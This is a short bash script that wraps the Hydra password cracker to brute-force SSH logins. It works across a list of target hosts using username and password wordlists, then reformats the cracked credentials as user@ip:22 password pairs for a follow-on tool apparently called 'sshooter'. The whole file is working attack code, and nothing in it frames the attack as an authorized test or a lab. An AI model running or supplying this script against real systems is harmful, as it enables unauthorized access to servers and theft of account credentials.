#!/usr/bin/env bash
# wrapper script for hydra ssh brute force attack.
echo "SSH Brute Force wrapper for HYDRA "
echo "[*] Prints it formatted for sshooter tool. ;)"


if [ -z "$4" ]
then
    echo "Usage: $0 <targets.txt> <usernames.txt> <passwords.txt> <out file>"

else
    targetfile=$1
    userfile=$2
    passfile=$3
    outfile=$4 #"../creds/hydra-ssh-creds-out.txt"
    echo "[+] SSH test info:"
    echo ""
    echo "Targets:    $targetfile"
    echo "Usernames:  $userfile"
    echo "Passwords:  $passfile"
    echo "Output:     $outfile"
    echo "=========== [ Testing: ] ==========="
    hydra -L $userfile -P $passfile -t4 -M $targetfile ssh -o /tmp/ssh_cred.tmp # | grep "password:" | cut -d":" -f2,3,4 | cut -d" " -f6,2,10 | awk -F" "  '{u=$2;at="@";ip=$1;port=":22";p=$3; print $2at$1port,$3}' > $outfile
    #echo "Usage: $0 <targets.txt> <usernames.txt> <passwords.txt>"
    echo ""
    echo "========== [ FINISHED! ] ==========="
    echo "========= [ Found Creds ] =========="
    cat /tmp/ssh_cred.tmp | grep "password:" | cut -d":" -f2,3,4 | cut -d" " -f6,2,10 | awk -F" "  '{u=$2;at="@";ip=$1;port=":22";p=$3; print $2at$1port,$3}' > $outfile
    rm /tmp/ssh_cred.tmp
    cat $outfile

fi
